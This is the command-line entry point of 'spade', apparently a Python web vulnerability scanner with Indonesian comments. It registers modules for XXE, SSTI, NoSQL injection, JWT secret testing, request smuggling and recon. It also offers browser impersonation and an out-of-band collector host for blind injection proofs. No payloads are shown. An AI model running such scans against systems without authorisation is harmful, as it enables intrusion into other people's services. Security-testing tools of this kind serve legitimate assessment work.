    ("ratelimit", ("Rate Limit", rate_limit)),
    ("hostheader",("Host Header/Cache", scan_host_header)),
    ("xxe",       ("XXE", scan_xxe)),
    ("ssti",      ("SSTI", scan_ssti)),
    ("nosqli",    ("NoSQL Injection", scan_nosqli)),
    ("graphql",   ("GraphQL", scan_graphql)),
    ("js",        ("JS Analysis", scan_js)),
    ("jwt",       ("JWT", scan_jwt)),
    ("recon",     ("Recon", scan_recon)),
    ("subdomains",("Subdomain", scan_subdomains)),
    ("apispec",   ("API Spec", scan_api_specs)),
    ("params",    ("Parameter Discovery", scan_params)),
    ("crlf",      ("CRLF Injection", scan_crlf)),
    ("smuggling", ("Request Smuggling", scan_smuggling)),
])

QUICK_MODULES = ["tech","headers","robots","sensitive","cors","tls","ratelimit"]
# Modul yang lebih lambat/intrusif hanya jalan di mode detailed.
DETAILED_ONLY = {"xxe","ssti","nosqli","graphql","js","jwt","recon","subdomains",
                 "apispec","params","hostheader","crlf","smuggling"}
STANDARD_MODULES = [k for k in ALL_MODULES if k not in DETAILED_ONLY]


def main(argv=None):
    """Entry point CLI. argv=None berarti pakai sys.argv (dipakai test dengan list eksplisit)."""
    global DISABLE_COLOR, REDACT_ENABLED
    parser = argparse.ArgumentParser(
        description="spade — Automated Web Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Contoh:
  python3 spade.py example.com                      # standard (default)
  python3 spade.py example.com --quick               # quick check
  python3 spade.py example.com --detailed            # full scan
  python3 spade.py example.com -o laporan.html       # custom output
  python3 spade.py example.com --csv hasil.csv       # export CSV
  python3 spade.py example.com --json hasil.json     # export JSON
  python3 spade.py example.com --sarif hasil.sarif   # export SARIF
  python3 spade.py example.com --recon-only          # recon saja (subdomain + URL historis)
  python3 spade.py example.com --detailed --port-scan # full + TCP connect scan""")
    parser.add_argument("target", nargs="?", default="", help="Target URL (opsional — akan diminta interaktif jika kosong)")
    parser.add_argument("-o","--output", default="", help="Laporan HTML")
    parser.add_argument("--csv", default="", help="Export CSV")
    parser.add_argument("--json", default="", metavar="FILE",
                        help="Export JSON (metadata scan + temuan + bukti, cocok untuk pipeline)")
    parser.add_argument("--sarif", default="", metavar="FILE",
                        help="Export SARIF 2.1.0 (untuk GitHub code scanning/CI)")
    parser.add_argument("--no-redact", action="store_true",
                        help="Matikan redaksi cookie/token/password di laporan. HATI-HATI: jangan dibagikan.")
    parser.add_argument("--quick", action="store_true", help="Mode cepat (7 modul, basic checks)")
    parser.add_argument("--detailed", action="store_true",
                        help="Mode lengkap (32 modul, crawl, recon, param discovery, JWT, OOB)")
    parser.add_argument("--no-color", action="store_true", help="Output tanpa warna")
    parser.add_argument("--skip-ssl", action="store_true", help="Nonaktifkan verifikasi SSL (untuk sertifikat self-signed/expired)")
    parser.add_argument("--cookie", action="append", default=[], metavar="N=V;M=X",
                        help="Cookie sesi untuk area terautentikasi (boleh diulang). Dipakai modul IDOR, CSRF, JWT, dan auth bypass.")
    parser.add_argument("-H", "--header", action="append", default=[], metavar="'Nama: nilai'",
                        help="Header tambahan untuk semua request, mis. token API atau cookie (boleh diulang).")
    parser.add_argument("--bearer", default="", metavar="TOKEN",
                        help="Token Bearer untuk header Authorization (alternatif -H 'Authorization: ...').")
    parser.add_argument("--jwt-secrets", default="", metavar="FILE",
                        help="File daftar secret JWT (satu per baris) untuk diuji offline terhadap token yang ditemukan.")
    parser.add_argument("--active-writes", action="store_true",
                        help="Izinkan uji yang mengirim data (submit form CSRF dengan token palsu). Default: mati.")
    parser.add_argument("--check-smuggling", action="store_true",
                        help="Aktifkan uji request smuggling CL.TE/TE.CL lewat socket mentah. Hanya untuk target yang mengizinkan.")
    parser.add_argument("--oob-host", default="", metavar="HOST",
                        help="Host collector OOB milik tester (mis. 10.0.0.5:9000) untuk bukti blind SSRF/XXE/CMDi. Jalankan tools/oob_collector.py di sana.")
    parser.add_argument("--impersonate", default=DEFAULT_IMPERSONATE, metavar="PROFIL",
                        help=f"Profil browser curl_cffi untuk menyamarkan request (default: {DEFAULT_IMPERSONATE}). Contoh: chrome136, safari184, firefox147")
    parser.add_argument("--no-impersonate", action="store_true", help="Matikan browser impersonation (fingerprint default curl; untuk debugging/paritas)")
    parser.add_argument("--workers", type=int, default=DEFAULT_WORKERS, help=f"Jumlah request paralel per scan (default: {DEFAULT_WORKERS}, 1 = sekuensial)")
    parser.add_argument("--crawl-depth", type=int, default=2, help="Kedalaman crawl mode detailed (default: 2)")
    parser.add_argument("--crawl-max", type=int, default=30, help="Maksimal halaman di-crawl mode detailed (default: 30)")
    parser.add_argument("--port-scan", action="store_true",
                        help="TCP connect scan ringan ke port umum (butuh --detailed atau --recon-only)")
    parser.add_argument("--recon-only", action="store_true",
                        help="Hanya jalankan recon (subdomain, URL historis, endpoint JS) tanpa modul vuln")
    parser.add_argument("--no-recon", action="store_true",
                        help="Lewati tahap recon di mode detailed (nama target tidak dikirim ke crt.sh/Wayback)")
    args = parser.parse_args(argv)
    if args.recon_only and (args.quick or args.detailed):
        parser.error("--recon-only tidak bisa digabung dengan --quick/--detailed")
    if args.recon_only and args.no_recon:
        parser.error("--recon-only butuh recon aktif — jangan digabung dengan --no-recon")
    if args.port_scan and not (args.detailed or args.recon_only):
        parser.error("--port-scan hanya berlaku bersama --detailed atau --recon-only")
    if args.no_color: DISABLE_COLOR = True
    if args.no_redact:
        REDACT_ENABLED = False
        print()
        warn("REDACT OFF — cookie/token/password ikut tersimpan di laporan. Jangan bagikan hasil scan ini.")

    # Validasi profil impersonasi sebelum request apa pun dikirim.
    profiles = supported_impersonate_profiles()
    if args.no_impersonate:
        args.impersonate = None
    elif args.impersonate not in profiles:
        parser.error(f"profil impersonate '{args.impersonate}' tidak dikenal. "
                     f"Contoh yang valid: chrome146, safari184, firefox147, edge101 (total {len(profiles)} profil)")

    # ── Validasi argumen autentikasi & OOB (semua sebelum request pertama) ──
    try:
        extra_headers = build_auth_headers(args.cookie, args.header, args.bearer)
    except ValueError as exc:
        parser.error(str(exc))
    auth_enabled = bool(extra_headers)
    jwt_secrets = []
    if args.jwt_secrets:
        try:
            with open(args.jwt_secrets, encoding="utf-8") as handle:
                jwt_secrets = [line.strip() for line in handle
                               if line.strip() and not line.lstrip().startswith("#")]
        except OSError as exc:
            parser.error(f"tidak bisa membaca --jwt-secrets '{args.jwt_secrets}': {exc.strerror or exc}")
        if not jwt_secrets:
            parser.error(f"--jwt-secrets '{args.jwt_secrets}' tidak berisi satu baris pun (satu secret per baris)")
    oob_host = oob_base(args.oob_host)
    if args.oob_host and not oob_host:
        parser.error("--oob-host kosong")
    if args.oob_host:
        hostpart = urllib.parse.urlparse(oob_host).hostname or ""
        is_ip = bool(re.fullmatch(r"[0-9]{1,3}(\.[0-9]{1,3}){3}", hostpart or ""))
        if not hostpart or not (is_ip or "." in hostpart or hostpart == "localhost" or ":" in args.oob_host):
            parser.error(f"--oob-host '{args.oob_host}' bukan alamat yang bisa dihubungi target "
                         f"(butuh host/IP/port, mis. 10.0.0.5:9000 atau collector.example.com)")

    # ── Interactive prompt jika target tidak diberikan ──
    if not args.target:
        print()
        print(f"    {c('bold',c('cyan','+===========[ SPADE ]===========+'))}")
        print(f"    {c('bold',c('cyan','|'))}  {c('bold','Web Vuln Scanner')}     {c('bold',c('cyan','|'))}")
        print(f"    {c('bold',c('cyan','+==============================+'))}")
        try:
            inp = input("\n  [>] Masukkan domain/URL target: ").strip()
            while not inp:
                inp = input("  [>] Target tidak boleh kosong: ").strip()
        except EOFError:
            print("\n  [!] Tidak ada input target (EOF). Keluar.", file=sys.stderr)
            return 2
        args.target = inp
        print()
        print("  Pilih mode scan:")
        print("    [1] Quick     — 7 modul, basic checks (cepat)")
        print("    [2] Standard  — 19 modul, recommended (default)")
        print("    [3] Detailed  — 32 modul, full scan dengan crawl + recon + subdomain")
        mode_ch = input("  [>] Pilih [1/2/3] (default: 2): ").strip()
        while mode_ch and mode_ch not in ("1","2","3"):
            mode_ch = input("  [>] Pilih 1, 2, atau 3: ").strip()
        if mode_ch == "1":
            args.quick = True
        elif mode_ch == "3":
            args.detailed = True
        # else default (standard)
        print()


    target = normalize_url(args.target)
    host = host_from_url(target)
    mode = "quick" if args.quick else ("detailed" if args.detailed
                                      else ("recon" if args.recon_only else "standard"))

    print()
    print(f"    {c('bold',c('cyan','+===========[ SPADE ]===========+'))}")
    print(f"    {c('bold',c('cyan','|'))}  {c('bold','Web Vuln Scanner')}     {c('bold',c('cyan','|'))}")
    print(f"    {c('bold',c('cyan','|'))}  mode: {c('bold',mode.upper())}{' '*(13-len(mode))}  {c('bold',c('cyan','|'))}")
    print(f"    {c('bold',c('cyan','+==============================+'))}")
    print()
    info(f"Target: {c('bold',target)}")
    info(f"Mode  : {mode.upper()}")
    info(f"Bot   : {args.impersonate or 'tanpa impersonation'}")
    if auth_enabled:
        info(f"Auth  : {_redact_auth_headers(extra_headers)}")
        warn("Scan memakai sesi autentikasi — pastikan akun dan scope sudah diizinkan program.")
    if oob_host:
        info(f"OOB   : collector {oob_host}")
        if urllib.parse.urlparse(oob_host).hostname == host_from_url(target).split(":")[0]:
            warn("--oob-host menunjuk ke host target yang sama — collector tidak akan terlihat sebagai callback eksternal.")
    if args.active_writes:
        warn("ACTIVE WRITES ON — modul CSRF mengirim POST ke target (bisa mengubah data).")
    if args.check_smuggling:
        warn("REQUEST SMUGGLING ON — socket mentah CL.TE/TE.CL dikirim ke target.")
    if args.port_scan:
        warn("PORT SCAN ON — TCP connect scan ke port umum di target dan host hasil enumerasi.")
    if args.recon_only:
        warn("RECON ONLY — hanya enumerasi, modul kerentanan tidak dijalankan.")
    if jwt_secrets:
        info(f"JWT   : {len(jwt_secrets)} secret tambahan dari {args.jwt_secrets}")
    info(f"Start : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    verify_ssl = not args.skip_ssl
    set_request_executor(args.workers)
    sess = ThreadLocalSession(timeout=15, verify_ssl=verify_ssl, impersonate=args.impersonate,
                              extra_headers=extra_headers)
    # Sesi anonim (tanpa kredensial) untuk pembanding: IDOR, auth bypass, cache deception,
    # dan orakel token JWT butuh tahu respons apa yang diterima pengunjung tanpa login.
    anon_sess = ThreadLocalSession(timeout=15, verify_ssl=verify_ssl,
                                   impersonate=args.impersonate) if auth_enabled else None
    # Bukti (request/response) hanya boleh berasal dari scan yang sedang berjalan.
    reset_evidence()
    set_evidence_base_url(target)
    finds = FindingList(target)
    start = datetime.now()
    scan = {
        "mode": mode,
        "started_at": start.isoformat(timespec="seconds"),
        "finished_at": None,
        "duration_s": None,
        "impersonate": args.impersonate,
        "workers": args.workers,
        "auth": auth_enabled,
        "active_writes": bool(args.active_writes),
        "check_smuggling": bool(args.check_smuggling),
        "oob": bool(oob_host),
        "recon": {"enabled": False, "sources": {}, "counts": {}, "errors": []},
        "port_scan": bool(args.port_scan),
        "recon_only": bool(args.recon_only),
        "modules": [],
        "errors": [],
        "redacted": bool(REDACT_ENABLED),
    }
    ctx = {
        "crawler": None,
        "auth_enabled": auth_enabled,
        "anon_sess": anon_sess,
        "active_writes": bool(args.active_writes),
        "check_smuggling": bool(args.check_smuggling),
        "oob_host": oob_host,
        "jwt_secrets": jwt_secrets,
        "recon": None,
        "recon_urls": [],
        "recon_js_endpoints": [],
        "recon_param_targets": [],
        "js_texts": {},
        "port_scan": bool(args.port_scan),
        "recon_only": bool(args.recon_only),
    }

    wafs = waf_detect(sess, target, ctx)
    if wafs: info(f"WAF terdeteksi: {', '.join(wafs)}")
    # Ambil halaman utama sekali, agar modul pasif (headers/tech/js/jwt/crawl) tidak request berulang.
    base_resp = get_base_response(sess, target, ctx)

    # ── Recon (bagian 3): dijalankan sebelum crawler supaya URL historis bisa
    # dipakai sebagai seed, dan sebelum modul injection supaya pool parameter
    # recon sudah tersedia saat modul itu jalan. ──
    recon_on = mode in ("detailed", "recon") and not args.no_recon
    if recon_on:
        info("Recon: enumerasi subdomain, URL historis, dan host hidup...")
        recon_data = recon_gather(sess, target, ctx)
        counts = recon_data.get("counts") or {}
        info(f"Recon: {counts.get('subdomains', 0)} subdomain, {counts.get('live_hosts', 0)} host hidup, "
             f"{counts.get('historic_urls', 0)} URL historis")
        scan["recon"] = {"enabled": True, "sources": recon_data.get("sources") or {},
                         "counts": dict(counts), "errors": recon_data.get("errors") or []}

    if mode == "quick":
        modules = list(QUICK_MODULES)
        crawler = None
    elif mode in ("detailed", "recon"):
        modules = list(ALL_MODULES.keys()) if mode == "detailed" else ["recon"]
        if args.no_recon:
            modules = [k for k in modules if k != "recon"]
        info("Merayapi halaman (depth 2)...")
        crawler = Crawler(sess, target, depth=args.crawl_depth, max_p=args.crawl_max,
                          extra_seeds=recon_seed_urls(ctx))
        crawler.crawl(seed_text=base_resp.text if base_resp is not None else None)
        info(f"Merayapi {len(crawler.pages)} halaman")
        print()
    else:
        modules = list(STANDARD_MODULES)
        crawler = None
    ctx["crawler"] = crawler
    if recon_on:
        # Panen endpoint JS setelah crawl supaya berkas JS dari halaman hasil
        # crawl ikut terbaca, lalu dipakai modul `js` tanpa unduh ulang.
        recon_js_data = recon_js(sess, target, ctx)
        ctx["recon_js_endpoints"] = list(recon_js_data.get("endpoints") or [])
        scan["recon"]["counts"]["js_endpoints"] = len(ctx["recon_js_endpoints"])

    info(f"Menjalankan {len(modules)} modul...")
    for key in modules:
        name, func = ALL_MODULES[key]
        print(f"\n  {c('bold',c('magenta','---'))} {c('bold',name)}")
        scan["modules"].append(key)
        try:
            res = func(sess, target, ctx)
            if res: finds.extend(res)
        except Exception as exc:
            # Satu modul gagal tidak boleh membatalkan scan, tapi juga tidak boleh
            # hilang diam-diam: catat sebagai temuan INFO + masuk ke scan["errors"].
            detail = f"Modul '{key}' ({name}) gagal dijalankan: {type(exc).__name__}: {exc}"
            scan["errors"].append({"module": key, "error": f"{type(exc).__name__}: {exc}"})
            err(detail)
            # Bukti HTTP tidak relevan untuk kegagalan modul, jadi tempel bukti
            # dimatikan supaya laporan tidak menyesatkan.
            finds.append(("INFO", "SCAN_ERROR", detail, target), evidence_url=None)

    end = datetime.now()
    dur = (end-start).total_seconds()
    scan["finished_at"] = end.isoformat(timespec="seconds")
    scan["duration_s"] = round(dur, 2)
    print(f"\n  {c('bold',c('magenta','+==============================+'))}")
    print()
    info(f"Selesai dalam {dur:.1f}s")
    info(f"Total temuan: {len(finds)}")
    for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
        n = sum(1 for f in finds if f[0]==sev)
        if n>0: ic = {"CRITICAL":"bg_red","HIGH":"red","MEDIUM":"yellow","LOW":"blue","INFO":"dim"}; print(f"    {c(ic.get(sev,''),f'{sev}: {n}')}")
    print()

    outpath = args.output or f"spade_{host}.html"
    gen_html(finds, target, start, end, outpath, impersonate=args.impersonate)
    good(f"Laporan: {outpath}")
    if args.csv:
        gen_csv(finds, target, args.csv)
        good(f"CSV   : {args.csv}")
    if args.json:
        gen_json(finds, target, args.json, scan=scan)
        good(f"JSON  : {args.json}")
    if args.sarif:
        gen_sarif(finds, target, args.sarif, scan=scan)
        good(f"SARIF : {args.sarif}")
    if scan["errors"]:
        warn(f"{len(scan['errors'])} modul gagal — lihat temuan SCAN_ERROR di laporan.")
    print()
    return 0

if __name__ == "__main__":
    sys.exit(main())
